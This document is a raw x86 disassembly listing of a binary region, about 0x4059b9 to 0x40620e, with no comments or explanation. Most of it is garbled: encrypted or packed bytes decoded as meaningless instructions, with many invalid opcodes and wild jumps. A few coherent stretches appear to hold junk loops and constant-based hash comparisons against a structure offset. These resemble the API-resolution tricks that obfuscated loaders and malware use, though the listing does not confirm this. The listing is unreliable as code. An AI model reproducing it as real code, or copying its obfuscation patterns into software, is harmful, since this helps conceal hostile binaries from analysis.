  4059b9:	xor    BYTE PTR [eax],ch
  4059bb:	and    DWORD PTR [ebx],ecx
  4059bd:	das    
  4059be:	or     BYTE PTR [ecx],bl
  4059c0:	jp     0x405a1f
  4059c2:	aas    
  4059c3:	jl     0x405a3e
  4059c5:	int    0x45
  4059c7:	push   esp
  4059c8:	and    bl,al
  4059ca:	inc    ebx
  4059cb:	daa    
  4059cc:	test   DWORD PTR [edx],esi
  4059ce:	aad    0x86
  4059d0:	xchg   esi,eax
  4059d1:	push   ss
  4059d2:	pop    edx
  4059d3:	stos   BYTE PTR es:[edi],al
  4059d4:	inc    ebp
  4059d5:	jp     0x4059ed
  4059d7:	and    BYTE PTR [edx-0x17],dh
  4059da:	ja     0x405a50
  4059dc:	jns    0x405962
  4059de:	xor    dh,dl
  4059e0:	xchg   edx,eax
  4059e1:	push   edi
  4059e2:	(bad)  
  4059e3:	mov    dl,0xd
  4059e5:	sbb    eax,0x34dab703
  4059ea:	xchg   esp,eax
  4059eb:	js     0x4059c9
  4059ed:	cdq    
  4059ee:	xchg   BYTE PTR [ebx],dl
  4059f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059f1:	or     DWORD PTR [eax+0x5de57ab],edx
  4059f7:	dec    eax
  4059f8:	sbb    eax,0x3c50079b
  4059fd:	cs adc edx,edi
  405a00:	idiv   BYTE PTR [esi-0x2d06c75e]
  405a06:	fldcw  WORD PTR [eax-0x71]
  405a09:	sub    BYTE PTR [ebx],bh
  405a0b:	sub    BYTE PTR [esi+0x46],bl
  405a0e:	or     eax,0xaaccfcf1
  405a13:	cmp    edi,DWORD PTR [ebp+0x2c]
  405a16:	inc    eax
  405a17:	mov    ss,WORD PTR [esi-0x15344add]
  405a1d:	and    bh,BYTE PTR [ecx+0x4b]
  405a20:	cli    
  405a21:	xlat   BYTE PTR ds:[ebx]
  405a22:	or     DWORD PTR [edi+0x17],edi
  405a25:	je     0x405a60
  405a27:	push   edi
  405a28:	daa    
  405a29:	fmul   DWORD PTR [edi+0xac21381]
  405a2f:	cwde   
  405a30:	jb     0x405a5f
  405a32:	outs   dx,DWORD PTR ds:[esi]
  405a33:	mov    al,0xce
  405a35:	(bad)  
  405a36:	mov    bh,0x10
  405a38:	in     eax,dx
  405a39:	push   es
  405a3a:	push   ss
  405a3b:	loope  0x405a0c
  405a3d:	push   es
  405a3e:	cmp    edx,DWORD PTR [ebx-0x111926c4]
  405a44:	xor    DWORD PTR [esi+0x40d1555e],edi
  405a4a:	shl    BYTE PTR [edi],cl
  405a4c:	retf   
  405a4d:	adc    cl,BYTE PTR [edx-0x7ba3820]
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fd71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fd71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fd71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fd71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fd71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e35b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fd59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fd59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fd59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e5b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fd59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fd59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fd51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e777,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x69fa624d
  405b88:	sti    
  405b89:	xchg   DWORD PTR [edx+esi*1+0x7eaa7070],eax
  405b90:	jo     0x405c02
  405b92:	mov    bl,0x77
  405b94:	addr16 xor eax,0xad313d53
  405b9a:	mov    al,0x9
  405b9c:	jl     0x405b3a
  405b9e:	js     0x405bbe
  405ba0:	cdq    
  405ba1:	ja     0x405b51
  405ba3:	div    BYTE PTR [eax+eax*8+0x2154d96b]
  405baa:	popa   
  405bab:	jnp    0x405b55
  405bad:	push   0xdb2bd16b
  405bb2:	test   eax,0xffcd972d
  405bb7:	cmp    DWORD PTR [edi+0x570741fa],0xe0028084
  405bc1:	(bad)  
  405bc2:	mov    ds:0xcf4c6cf2,al
  405bc7:	gs jne 0x405b6d
  405bca:	mov    esp,0x5602cd74
  405bcf:	enter  0xa6e2,0x7a
  405bd3:	pop    esp
  405bd4:	or     esi,DWORD PTR [edi+0x6]
  405bd7:	xchg   edi,eax
  405bd8:	and    esi,ebx
  405bda:	jmp    0x1d018ae
  405bdf:	(bad)  
  405be0:	pop    esi
  405be1:	fldenv [edx-0xcaa6d6d]
  405be7:	dec    ecx
  405be8:	pushf  
  405be9:	dec    esi
  405bea:	adc    bl,cl
  405bec:	clc    
  405bed:	out    0xcb,al
  405bef:	jmp    0x343b:0x8873b8ec
  405bf6:	adc    BYTE PTR [ebx-0x51319886],0x3
  405bfd:	aas    
  405bfe:	push   esp
  405bff:	jno    0x405bcd
  405c01:	mov    dh,bh
  405c03:	(bad)  
  405c04:	jecxz  0x405bb8
  405c06:	jnp    0x405c22
  405c08:	dec    eax
  405c09:	inc    ebx
  405c0a:	addr16 inc eax
  405c0c:	push   ebp
  405c0d:	inc    ebx
  405c0e:	imul   BYTE PTR [edx]
  405c10:	(bad)  
  405c12:	imul   edi,DWORD PTR [edi-0x42],0xd500a4f9
  405c19:	mov    es:0xf2f0ef64,al
  405c1f:	in     eax,dx
  405c20:	jae    0x405c71
  405c22:	shr    dh,cl
  405c24:	jle    0x405c4c
  405c26:	and    edi,DWORD PTR [edi]
  405c28:	push   ecx
  405c29:	sub    eax,0x174b583b
  405c2e:	pop    ebp
  405c2f:	adc    eax,0xd5494dd7
  405c34:	fbstp  TBYTE PTR [eax-0x70]
  405c37:	clc    
  405c38:	and    DWORD PTR [ecx+0x5833843d],edi
  405c3e:	loopne 0x405c48
  405c40:	or     BYTE PTR [esi+0x2b],bh
  405c43:	mov    cl,0xe1
  405c45:	mov    DWORD PTR [ebp-0x1],eax
  405c48:	mov    ecx,0xb3ed0a69
  405c4d:	sub    eax,0xd1a31c41
  405c52:	dec    ebp
  405c53:	outs   dx,BYTE PTR ds:[esi]
  405c54:	xor    al,0x9
  405c56:	out    dx,eax
  405c57:	into   
  405c58:	cmp    ch,BYTE PTR [esp+ebp*8+0x16]
  405c5c:	(bad)  
  405c5d:	xor    DWORD PTR [ebx+0x6056da7f],ebx
  405c63:	xor    esp,DWORD PTR [eax-0x34fd105f]
  405c69:	icebp  
  405c6a:	push   edx
  405c6b:	mov    edx,0xfd41ab50
  405c70:	shl    BYTE PTR [ecx],cl
  405c72:	inc    ebp
  405c73:	push   ss
  405c74:	lods   al,BYTE PTR ds:[esi]
  405c75:	xchg   esi,eax
  405c76:	dec    ecx
  405c77:	jmp    0x2b3eb193
  405c7c:	and    BYTE PTR [edx-0x79],bh
  405c7f:	loope  0x405cc5
  405c81:	int    0x2b
  405c83:	push   ecx
  405c84:	popa   
  405c85:	inc    edx
  405c86:	add    BYTE PTR [ebx],ah
  405c88:	adc    BYTE PTR [ebp+0x6fb1c265],cl
  405c8e:	inc    ecx
  405c8f:	lods   eax,DWORD PTR ds:[esi]
  405c90:	les    esi,FWORD PTR [ecx]
  405c92:	mov    edx,0x3957850a
  405c97:	pop    ecx
  405c98:	popa   
  405c99:	ss xchg ebp,eax
  405c9b:	retf   0x9bbb
  405c9e:	jnp    0x405cf9
  405ca0:	xchg   ebx,eax
  405ca1:	jg     0x405cd4
  405ca3:	pop    ecx
  405ca4:	aaa    
  405ca5:	fist   WORD PTR [ecx+0x66294703]
  405cab:	retf   0x7799
  405cae:	pushf  
  405caf:	cwde   
  405cb0:	sbb    al,0x17
  405cb2:	jae    0x405c6b
  405cb4:	lods   al,BYTE PTR ds:[esi]
  405cb5:	fbstp  TBYTE PTR [ecx+0x708dd02c]
  405cbb:	adc    al,ah
  405cbd:	sub    BYTE PTR [ebp+0x50b31132],ch
  405cc3:	xor    DWORD PTR [ebx+esi*4+0x7a],ecx
  405cc7:	or     ebp,DWORD PTR ds:0xa981ec16
  405ccd:	cwde   
  405cce:	fisub  DWORD PTR [eax-0x503a831e]
  405cd4:	push   ebp
  405cd5:	sub    ebx,DWORD PTR [edx-0x5c]
  405cd8:	retf   0x5281
  405cdb:	push   ds
  405cdc:	pop    edi
  405cdd:	xchg   edx,eax
  405cde:	or     al,0x80
  405ce0:	pop    esi
  405ce1:	pop    esp
  405ce2:	mov    al,ds:0xc6bee1ea
  405ce7:	sti    
  405ce8:	dec    ebx
  405ce9:	into   
  405cea:	mov    eax,0x390a8c22
  405cef:	lds    edx,FWORD PTR ds:0xc78da42
  405cf5:	shl    BYTE PTR [esi],1
  405cf7:	shl    eax,1
  405cf9:	push   0x1
  405cfb:	in     eax,0xd2
  405cfd:	push   0xffffff8e
  405cff:	into   
  405d00:	gs sbb edi,0x2c785669
  405d07:	xchg   BYTE PTR [edx+0x68ed0912],dh
  405d0d:	pop    es
  405d0e:	pop    ss
  405d0f:	int    0x78
  405d11:	popf   
  405d12:	fmul   QWORD PTR [eax-0x3d]
  405d15:	sub    BYTE PTR [eax+0x46],ch
  405d18:	fisubr DWORD PTR [ecx-0x5fcd7125]
  405d1e:	pop    eax
  405d1f:	dec    ebx
  405d20:	add    al,0x44
  405d22:	push   edi
  405d23:	mov    ds:0xafa01d86,al
  405d28:	dec    eax
  405d29:	inc    esp
  405d2a:	popf   
  405d2b:	loopne 0x405d95
  405d2d:	xor    edx,DWORD PTR [ecx+0xb]
  405d30:	loop   0x405d6b
  405d32:	int3   
  405d33:	xor    ebp,ebp
  405d35:	imul   edi,DWORD PTR [esi+0x5],0xece27fc2
  405d3c:	ds mov edi,0xc6608532
  405d42:	xchg   BYTE PTR [ebp+0xc0e19e],dh
  405d48:	(bad)  
  405d49:	stos   BYTE PTR es:[edi],al
  405d4a:	in     eax,dx
  405d4b:	pop    esp
  405d4c:	xchg   ebx,eax
  405d4d:	(bad)  
  405d4e:	aaa    
  405d4f:	sbb    esi,eax
  405d51:	out    0x10,al
  405d53:	repnz fld TBYTE PTR [esi+0x498a414b]
  405d5a:	imul   edx,DWORD PTR [edi+0x5b],0xffffffd0
  405d5e:	in     al,0xef
  405d60:	sbb    eax,0x4caa50b0
  405d65:	cmc    
  405d66:	icebp  
  405d67:	rcl    DWORD PTR [edi+0x4],0xff
  405d6b:	and    bl,bl
  405d6d:	aas    
  405d6e:	and    ah,dh
  405d70:	out    dx,al
  405d71:	xor    ecx,DWORD PTR [eax-0x7c111f76]
  405d77:	adc    bl,dl
  405d79:	or     DWORD PTR [esi+eiz*1-0x66],0xc
  405d7e:	cmp    ebp,DWORD PTR [edx-0x21]
  405d81:	sub    ebp,DWORD PTR ds:[ebx-0x35]
  405d85:	mov    al,0x21
  405d87:	push   ebx
  405d88:	aas    
  405d89:	(bad)  
  405d8a:	push   ecx
  405d8b:	fs push ebx
  405d8d:	push   ebx
  405d8e:	stos   DWORD PTR es:[edi],eax
  405d8f:	add    al,0x92
  405d91:	dec    esi
  405d92:	pop    ss
  405d93:	adc    dh,BYTE PTR [esi]
  405d95:	(bad)  
  405d96:	mov    ch,0x29
  405d98:	xchg   ebx,eax
  405d99:	pop    es
  405d9a:	inc    esi
  405d9b:	push   cs
  405d9c:	rcl    DWORD PTR [edi+edi*8-0x3ea5b91f],0x5c
  405da4:	out    dx,al
  405da5:	fisubr WORD PTR [esi-0x74]
  405da8:	ret    
  405da9:	jg     0x405d9a
  405dab:	mov    ebp,DWORD PTR [ecx+0x78]
  405dae:	cmc    
  405daf:	and    DWORD PTR [ecx],0x2f
  405db2:	sub    bl,bl
  405db4:	fwait
  405db5:	jg     0x405dc6
  405db7:	cmp    eax,0x9
  405dba:	enter  0x2af7,0x3a
  405dbe:	adc    eax,0x1a7c2c99
  405dc3:	xchg   esp,eax
  405dc4:	inc    edi
  405dc5:	push   esp
  405dc6:	push   0x28
  405dc8:	sub    al,0x42
  405dca:	inc    ebp
  405dcb:	sub    DWORD PTR [ebx-0x41],0x9ee6367b
  405dd2:	push   esi
  405dd3:	jge    0x405dc8
  405dd5:	push   ds
  405dd6:	outs   dx,BYTE PTR ds:[esi]
  405dd7:	test   eax,0x311c061c
  405ddc:	mov    WORD PTR [ecx+ebp*8-0x79],?
  405de0:	loop   0x405e00
  405de2:	push   ss
  405de3:	imul   eax,DWORD PTR [ebx+0x3],0xffffff90
  405de7:	aam    0xe1
  405de9:	cli    
  405dea:	int    0xc2
  405dec:	retf   0x5b0
  405def:	icebp  
  405df0:	mov    BYTE PTR [edx+0x7034d7a9],bl
  405df6:	stos   DWORD PTR es:[edi],eax
  405df7:	das    
  405df8:	pushf  
  405df9:	out    0xe4,al
  405dfb:	and    ebx,eax
  405dfd:	aaa    
  405dfe:	jg     0x405d8b
  405e00:	and    eax,0xed85ca89
  405e05:	je     0x405e56
  405e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e08:	push   ebx
  405e09:	mov    BYTE PTR [ebx+0x1b],bl
  405e0c:	jecxz  0x405df9
  405e0e:	ret    
  405e0f:	popa   
  405e10:	cmp    al,0x24
  405e12:	or     dl,bl
  405e14:	dec    eax
  405e15:	adc    BYTE PTR [eax-0x62],0x94
  405e19:	pop    ebp
  405e1a:	fcom   DWORD PTR [ebx]
  405e1c:	lods   eax,DWORD PTR ds:[esi]
  405e1d:	out    0x12,eax
  405e1f:	ins    BYTE PTR es:[edi],dx
  405e20:	xor    edi,edx
  405e22:	mov    al,0x6
  405e24:	jecxz  0x405e4a
  405e26:	shr    DWORD PTR [edx-0x68],cl
  405e29:	dec    esi
  405e2a:	iret   
  405e2b:	in     al,0x18
  405e2d:	rol    BYTE PTR [ebp+0x2ec0ebc9],cl
  405e33:	xchg   esp,eax
  405e34:	in     eax,dx
  405e35:	call   0x355e2721
  405e3a:	fs stc 
  405e3c:	mov    ch,0x1d
  405e3e:	inc    edi
  405e3f:	sub    cl,BYTE PTR [edi+0x601d365a]
  405e45:	jno    0x405e4d
  405e47:	sbb    esi,DWORD PTR [ebx]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e78f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e76f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x82
  405ea8:	aad    0xa4
  405eaa:	sbb    eax,0x70703f3e
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e64
  405eb4:	gs mov edx,0xf2ad5b37
  405eba:	mov    BYTE PTR [esi-0x21585021],bh
  405ec0:	retf   
  405ec1:	cmp    ebp,0x21023784
  405ec7:	mov    eax,0x9a1785e3
  405ecc:	cli    
  405ecd:	sti    
  405ece:	adc    BYTE PTR [edi],0x85
  405ed1:	push   es
  405ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed3:	out    0xf9,al
  405ed5:	add    ch,ch
  405ed7:	int    0x9a
  405ed9:	adc    al,0xc6
  405edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405edc:	and    al,0x5d
  405ede:	mov    ds:0x144eb33,al
  405ee3:	data16 lahf 
  405ee5:	or     BYTE PTR [ecx],bl
  405ee7:	ret    0xa489
  405eea:	div    al
  405eec:	in     al,dx
  405eed:	in     eax,dx
  405eee:	inc    ebx
  405eef:	push   ebp
  405ef0:	(bad)
  405ef4:	sbb    ah,dh
  405ef6:	or     BYTE PTR [esi-0x31],bl
  405ef9:	ds mov edi,0x53838a40
  405eff:	inc    ecx
  405f00:	mov    eax,ds:0xf73eafe0
  405f05:	pop    es
  405f06:	adc    ebx,0x77a92b12
  405f0c:	pop    esi
  405f0d:	push   ebx
  405f0e:	mov    eax,ds:0xa7ff665c
  405f13:	(bad)  [esi]
  405f15:	xchg   DWORD PTR ds:0x33b02f0,ebp
  405f1b:	in     eax,0x1a
  405f1d:	xchg   ebp,eax
  405f1e:	fidivr DWORD PTR [esi]
  405f20:	cmp    BYTE PTR [eax+0x77],cl
  405f23:	data16 fisttp QWORD PTR [eax+edi*1-0x6a]
  405f28:	sbb    ebx,esi
  405f2a:	sub    ebp,DWORD PTR [ebx-0x12be5aea]
  405f30:	arpl   WORD PTR [edi-0x327e95f9],dx
  405f36:	in     al,0xc7
  405f38:	mov    bl,0xde
  405f3a:	or     ebp,edi
  405f3c:	es ds add eax,0x91a703d3
  405f43:	popf   
  405f44:	lods   al,BYTE PTR ds:[esi]
  405f45:	cmp    DWORD PTR [ebp+0x40ed98e1],ebx
  405f4b:	aad    0x1e
  405f4d:	hlt    
  405f4e:	scas   eax,DWORD PTR es:[edi]
  405f4f:	popf   
  405f50:	xor    DWORD PTR [edx-0x3e2ecb0d],0x3e
  405f57:	xchg   ecx,eax
  405f58:	push   cs
  405f59:	lods   eax,DWORD PTR ds:[esi]
  405f5a:	daa    
  405f5b:	adc    dh,BYTE PTR [edi]
  405f5d:	out    dx,al
  405f5e:	adc    DWORD PTR [eax+eiz*8-0x25e9942d],0x3e516af7
  405f69:	mov    esi,0xe3ef0687
  405f6e:	nop
  405f6f:	fs mov dl,0xb
  405f72:	arpl   WORD PTR [ebp-0x5b],cx
  405f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f76:	in     eax,0x87
  405f78:	retf   
  405f79:	mov    eax,ds:0x7641480a
  405f7e:	(bad)  
  405f7f:	mov    WORD PTR [edi],ss
  405f81:	sub    dl,ch
  405f83:	test   ah,cl
  405f85:	adc    al,0x7d
  405f87:	(bad)  
  405f88:	fild   WORD PTR [ebx]
  405f8a:	shr    dl,cl
  405f8c:	pop    edi
  405f8d:	mov    esp,0xefb6b245
  405f92:	(bad)  
  405f93:	fdivr  st,st(3)
  405f95:	pop    eax
  405f96:	cmp    al,0xae
  405f98:	or     DWORD PTR [ebx],ebx
  405f9a:	sti    
  405f9b:	lods   al,BYTE PTR ds:[esi]
  405f9c:	mov    ds:0x6c776abc,al
  405fa1:	cmp    al,0x22
  405fa3:	arpl   WORD PTR [ebp+0x5ff0d9f8],si
  405fa9:	jle    0x405fb4
  405fab:	pusha  
  405fac:	dec    ebx
  405fad:	jp     0x405f5e
  405faf:	xchg   ebp,eax
  405fb0:	test   al,0x97
  405fb2:	add    bh,bh
  405fb4:	jo     0x405fb5
  405fb6:	sub    BYTE PTR [edx+esi*2-0x34],0x79
  405fbb:	jg     0x405fc8
  405fbd:	into   
  405fbe:	sbb    al,0xa9
  405fc0:	and    DWORD PTR [ecx*8+0x35a7bab8],ebx
  405fc7:	jmp    0xc1fd4486
  405fcc:	cmp    DWORD PTR [edx+0x5e],0x99ac61ed
  405fd3:	(bad)  
  405fd5:	call   0xa05d:0x31b69f64
  405fdc:	cmp    BYTE PTR [ecx-0x52dc2cd],bh
  405fe2:	mov    bl,0xb5
  405fe4:	mov    bl,0x43
  405fe6:	std    
  405fe7:	cmp    dl,BYTE PTR [ecx]
  405fe9:	imul   edx,DWORD PTR [edi+eax*1],0x4fccbd18
  405ff0:	sub    BYTE PTR cs:[edi-0x177a5e3c],ah
  405ff7:	add    eax,0x2ce313f
  405ffc:	xchg   ebp,eax
  405ffd:	rol    DWORD PTR [ebx+0x63],0xa0
  406001:	mov    dl,0x4b
  406003:	daa    
  406004:	sbb    DWORD PTR [ebx],esi
  406006:	mov    ds:0x875a92cb,al
  40600b:	fcom   DWORD PTR [ecx]
  40600d:	mov    gs:0xb098ae81,al
  406013:	in     al,0x6b
  406015:	shl    DWORD PTR [ebp+0x5a],1
  406018:	fld    DWORD PTR [edx+ebp*4-0x36]
  40601c:	xchg   BYTE PTR [edi+edi*4],al
  40601f:	add    eax,0xdd56c63
  406024:	in     eax,0xec
  406026:	mov    edi,0x820c4419
  40602b:	rol    DWORD PTR [ecx],1
  40602d:	pop    ecx
  40602e:	mov    edx,0xe3ed928e
  406033:	test   DWORD PTR [eax+0x18],ebx
  406036:	push   DWORD PTR [edi+0x3f]
  406039:	loope  0x405fc1
  40603b:	popf   
  40603c:	push   esi
  40603d:	add    al,0x9f
  40603f:	test   al,0xe1
  406041:	je     0x406083
  406043:	fild   WORD PTR [edi-0x8caf920]
  406049:	outs   dx,BYTE PTR ds:[esi]
  40604a:	fwait
  40604b:	xchg   esi,eax
  40604c:	cli    
  40604d:	cmp    al,0x3c
  40604f:	sub    DWORD PTR [ebx],eax
  406051:	pop    esi
  406052:	xchg   BYTE PTR [ecx],dh
  406054:	jmp    0x5323:0x2c3a85de
  40605b:	ss add eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fe06,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e198
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fdf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fd71,0x42e19c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fd51,0x42e77b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fd55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x41123796
  4060dc:	sbb    eax,0x70703e65
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40606c
  4060e6:	cwde   
  4060e7:	loop   0x406096
  4060e9:	xlat   BYTE PTR ds:[ebx]
  4060ea:	dec    edi
  4060eb:	cmp    ecx,DWORD PTR [ebp+0x31]
  4060ee:	dec    eax
  4060ef:	inc    esp
  4060f0:	loopne 0x406107
  4060f2:	scas   eax,DWORD PTR es:[edi]
  4060f3:	dec    ecx
  4060f4:	adc    eax,0xdb230e01
  4060f9:	add    eax,0x5fbf7a31
  4060fe:	xchg   DWORD PTR [ebx-0x1f93f3d4],eax
  406104:	jae    0x406145
  406106:	push   cs
  406107:	pusha  
  406108:	stos   DWORD PTR es:[edi],eax
  406109:	mov    edi,0x2f37b095
  40610e:	adc    eax,0x699b6d89
  406113:	mov    al,0x46
  406115:	stc    
  406116:	sahf   
  406117:	push   ebp
  406118:	ss dec ecx
  40611a:	inc    edi
  40611b:	jbe    0x4060aa
  40611d:	pop    edx
  40611e:	sbb    al,0x0
  406120:	add    dh,0x60
  406123:	inc    edx
  406124:	dec    edi
  406125:	outs   dx,DWORD PTR ds:[esi]
  406126:	arpl   WORD PTR ss:[eax+0x6e735af7],di
  40612d:	add    ch,dh
  40612f:	enter  0x4c19,0x67
  406133:	mov    ax,0xa7ee
  406137:	mov    edi,ebp
  406139:	and    edi,DWORD PTR [eax+0x2]
  40613c:	in     al,0x31
  40613e:	sub    ch,BYTE PTR [ebp-0x30]
  406141:	xor    DWORD PTR [edi-0x45b3a9e2],ebx
  406147:	mov    ecx,0xf3603595
  40614c:	adc    cl,BYTE PTR [esi+0x25]
  40614f:	cmp    esi,DWORD PTR [ecx]
  406151:	inc    ebx
  406152:	pop    ebp
  406153:	call   0xf28aa65d
  406158:	jae    0x4061d2
  40615a:	pop    ecx
  40615b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40615c:	div    bl
  40615e:	lea    esp,[ebx]
  406160:	xchg   ebp,eax
  406161:	fnstsw WORD PTR [eax]
  406163:	in     eax,dx
  406164:	sub    dl,dh
  406166:	jle    0x40618c
  406168:	and    edx,DWORD PTR [ecx]
  40616a:	or     ebp,edx
  40616c:	xor    ah,bh
  40616e:	fcomi  st,st(7)
  406170:	inc    edi
  406171:	je     0x406194
  406173:	loopne 0x4061a2
  406175:	loopne 0x406133
  406177:	lgs    edi,FWORD PTR [ecx-0x46df8520]
  40617e:	out    0xfb,al
  406180:	add    BYTE PTR [esi+0x3428cad],dl
  406186:	dec    esp
  406187:	ins    DWORD PTR es:[edi],dx
  406188:	(bad)  
  406189:	outs   dx,BYTE PTR ds:[esi]
  40618a:	and    eax,0x54c9b636
  40618f:	or     dh,BYTE PTR [ecx]
  406191:	mov    ebp,0x9a96c10f
  406196:	sbb    esi,esp
  406198:	fidiv  WORD PTR [edi-0x3356a800]
  40619e:	dec    edx
  40619f:	shl    DWORD PTR [ebx],1
  4061a1:	push   cs
  4061a2:	mov    ebp,0xa937fc65
  4061a7:	xchg   ecx,eax
  4061a8:	jge    0x4061e6
  4061aa:	sahf   
  4061ab:	fcom   DWORD PTR [edx-0xc]
  4061ae:	jle    0x406210
  4061b0:	mov    ah,0x48
  4061b2:	or     DWORD PTR [ecx],0x71c84c8a
  4061b8:	add    al,0x27
  4061ba:	mov    edi,0x6b1db157
  4061bf:	mov    esp,edx
  4061c1:	stos   BYTE PTR es:[edi],al
  4061c2:	mov    cl,0x1b
  4061c4:	inc    DWORD PTR [esi-0x21]
  4061c7:	or     eax,0xe84e32f3
  4061cc:	jmp    0x8220:0x9e919767
  4061d3:	hlt    
  4061d4:	bnd jmp 0x147b7ccf
  4061da:	call   esp
  4061dc:	in     eax,0x6c
  4061de:	in     al,dx
  4061df:	retf   0x4a7e
  4061e2:	mov    al,ds:0x2c132c03
  4061e7:	test   esp,esi
  4061e9:	call   0x1feb:0x1778f2a5
  4061f0:	mov    ebp,0x390a7f0d
  4061f5:	out    0xfb,al
  4061f7:	imul   eax,DWORD PTR ds:0x17af1abb,0x33
  4061fe:	mov    cl,0xaa
  406200:	pop    edx
  406201:	in     eax,0x5f
  406203:	dec    ebx
  406204:	xchg   ecx,eax
  406205:	fsubr  QWORD PTR [ecx]
  406207:	rcr    DWORD PTR [esi+ebx*8+0x57ae4c39],cl
  40620e:	ins    BYTE PTR es:[edi],dx
